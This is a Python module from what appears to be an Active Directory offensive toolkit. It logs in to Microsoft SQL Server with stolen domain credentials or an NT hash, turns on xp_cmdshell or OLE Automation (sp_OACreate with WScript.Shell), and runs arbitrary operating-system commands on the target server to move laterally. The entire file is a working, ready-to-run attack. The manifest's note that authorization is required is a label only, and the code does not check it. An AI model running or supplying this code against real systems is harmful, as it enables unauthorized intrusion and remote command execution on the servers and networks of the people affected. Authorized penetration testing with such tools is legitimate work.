"""MSSQL exec — SQL Server command execution via xp_cmdshell / sp_oacreate."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.lateral.mssql_exec.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["sql_execution", "os_command"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1021.002"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    port = getattr(args, "port", 1433)
    command = getattr(args, "command", "whoami")
    method = getattr(args, "mssql_method", "xp_cmdshell")
    windows_auth = getattr(args, "windows_auth", True)

    print(f"[*] MSSQL exec → {target}:{port} (method: {method})")

    try:
        from impacket.tds import MSSQL
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        ms_sql = MSSQL(target, port)
        ms_sql.connect()

        if windows_auth:
            result = ms_sql.login(
                cred.domain, cred.username, cred.password or "",
                None, cred.nt_hash if cred.has_hash else None,
                useWindowsAuth=True)
        else:
            result = ms_sql.login("", cred.username, cred.password or "")

        if not result:
            print("[-] Authentication failed")
            return 1

        print(f"[+] Authenticated to MSSQL as {cred.domain}\\{cred.username}")

        if method == "xp_cmdshell":
            print("[*] Enabling xp_cmdshell...")
            ms_sql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
            ms_sql.sql_query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")

            print(f"[*] Executing: {command}")
            ms_sql.sql_query("EXEC xp_cmdshell '{}'".format(command.replace("'", "''")))
            ms_sql.printReplies()

        elif method == "sp_oacreate":
            print("[*] Using OLE automation (sp_OACreate)...")
            ms_sql.sql_query("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;")
            ms_sql.sql_query(
                "DECLARE @o int; "
                "EXEC sp_OACreate 'WScript.Shell', @o out; "
                "EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c {}';".format(
                    command.replace("'", "''")))
            ms_sql.printReplies()

        ms_sql.disconnect()
        return 0

    except Exception as exc:
        print(f"[-] MSSQL error: {exc}", file=sys.stderr)
        return 1
